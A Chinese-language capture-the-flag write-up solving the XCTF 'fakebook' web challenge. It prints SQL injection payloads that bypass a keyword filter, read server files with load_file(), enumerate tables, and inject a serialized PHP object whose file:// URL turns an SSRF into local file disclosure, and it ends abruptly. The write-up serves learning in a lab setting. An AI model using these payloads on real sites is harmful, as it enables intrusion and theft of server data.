---
title: XCTF_fakebook
date: 2021-09-29 21:38:33
updated: 2021-09-29 21:38:33
tags: [sql注入]
categories: XCTF
toc: true
---
XCTF_fakegame的一道有趣题

<!-- more -->
## 一、fakebook

![](https://i.loli.net/2021/09/28/6JiUIWxgj4rCchD.png)

发现是个登录注册页面，没有明确的目标，先用dirsearch扫描下目录

![](https://i.loli.net/2021/09/28/4VXyQCrAbuS1l5U.png)

查看flag.php,发现没任何内容，可能是不允许外网访问，考虑利用SSRF漏洞的可能性

查看/robots.txt发现`/user.php.bak`备份文件，下载查看

```php+HTML
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
```

解题的关键应该就是这个get函数传入的$url

注册一个账号：

![](https://i.loli.net/2021/09/28/xrydTuZwhEpXeas.png)

点击admin，观察URL发现有个传参

![](https://i.loli.net/2021/09/28/WqKFzX29t16ZlIY.png)

更改参数，发现两个报错

![](https://i.loli.net/2021/09/28/TMVbt7viIG3xrEf.png)

尝试sql注入：

```bash
view.php?no=1 and 1=1# 正常 
view.php?no=1 and 1=2# 报错
```

说明存在<font color='red'>整型注入</font>,接着使用union注入常用套路：

> 建议一边手工注入，一边开启sqlmap在后台跑，因为可能会出现waf

order by 时，4正常，5报错，所以column是4

![](https://i.loli.net/2021/09/28/8VQJMoKYf1tFmhD.png)

果不其然，使用union时，出现了waf：

![](https://i.loli.net/2021/09/28/cABgP3vqOi156VK.png)

尝试一些基本的绕过方式：[SQL注入--绕过技巧](https://blog.csdn.net/weixin_44940180/article/details/107717511)

```bash
view.php?no=2 union (select 1,2,3,4) #
```

应该是直接拦截`union select`，发现2的回显位置出现了

![](https://i.loli.net/2021/09/28/iDuy5AtSHGgZdko.png)

分别查看当前数据库和用户：

![](https://i.loli.net/2021/09/28/Khqo4XrGnPdYkTz.png)![image-20210928225336783](https://i.loli.net/2021/09/28/VjcwlKYa8nxWIyR.png)

发现用户竟然是<font color='red'>root</font>用户，看了别人的教程，发现此处满足 `load_file()`的所有条件，所以可以直接读取flag.php

```bash
view.php?no=2 union (select 1,load_file("/var/www/html/flag.php"),3,4)#
```

查看相应位置的源代码：

![](https://i.loli.net/2021/09/28/Q6KxkqWh4JEm2fu.png)



------

前面忙活了那么多，结果出来个root用户，下面尝试用正常union注入去找表和字段：

找表：

```bash
view.php?no=2 union (select 1,group_concat('<br>',table_name),3,4 from information_schema.tables where table_schema=database())#
```

只找到了`users`表，紧接着找字段：

```bash
view.php?no=2 union (select 1,group_concat('<br>',column_name),3,4 from information_schema.columns where table_name='users')#
```

![](https://i.loli.net/2021/09/28/wOfv2k9De3xjM7A.png)

前3个字段是知道的，现在查看`data`字段：

```bash
view.php?no=2 union (select 1,data,3,4 from users)#
```

![](https://i.loli.net/2021/09/28/YofrIXEsu3tROxP.png)

是序列化后的用户，那么整个博客页面是不是有可能由这几个字段，最可能是data字段进行渲染的？！

测试发现，当前面的no=3时，而<font color='red'>第四个</font>传入序列化的对象后，页面仍可以正常显示！

```bash
view.php?no=3 union (select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:7:"123.com";}')#
```

![](https://i.loli.net/2021/09/28/9Gx2oKNRbmpTqwI.png)

想到之前提过的SSRF，可以利用`file://`协议读取本地文件!

```bash
view.php?no=2 union (select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}')#
```

没有出现什么东西，但查看源码发现一串很长的base64码

![](https://i.loli.net/2021/09/28/hIf3dyrvCKPpRoa.png)

解码得到：

```php
<?php

$flag = "flag{c1e552fdf77049fabf65168f22f7aeab}";
exit(0);
```

实际上在firefox渗透版里，直接点击就可以直接查看flag.php的源码：

![](https://i.loli.net/2021/09/28/lUHPewyV4MSZ7ft.png)

------

原本以为是道代码审计，结果是个注入，嗐，菜鸡只能走一步看一步。

听说在join的时候，有post的注入点，赶紧拿sqlmap试了下：



